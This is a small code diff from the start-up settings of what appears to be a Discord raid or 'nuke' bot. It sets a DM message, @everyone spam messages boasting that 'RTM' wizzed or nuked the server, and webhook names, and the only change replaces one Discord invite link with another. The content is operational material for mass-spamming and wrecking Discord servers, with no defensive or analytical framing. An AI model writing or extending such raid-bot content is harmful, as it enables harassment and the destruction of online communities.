@@ -1,6 +1,6 @@
 # Bot Start Point
 
-dm_msg = "**RTM Beamed You** https://youtu.be/gGzOhy9vNkg\nhttps://discord.gg/pE2f8KaK3R"
+dm_msg = "**RTM Beamed You** https://youtu.be/gGzOhy9vNkg\nhttps://discord.gg/hJZBtGwjkq"
 spam_messages = ["@everyone **RTM wizzed this** <a:__:770078001315446816>\nhttps://youtu.be/gGzOhy9vNkg", "@everyone **Wizzed by RTM | **https://discord.gg/pE2f8KaK3R"]
 webhook_usernames = ["RTM Wizzed U", "RTM", "RTM BEAMER", "🤫", "RTM NUUUKED"]
 
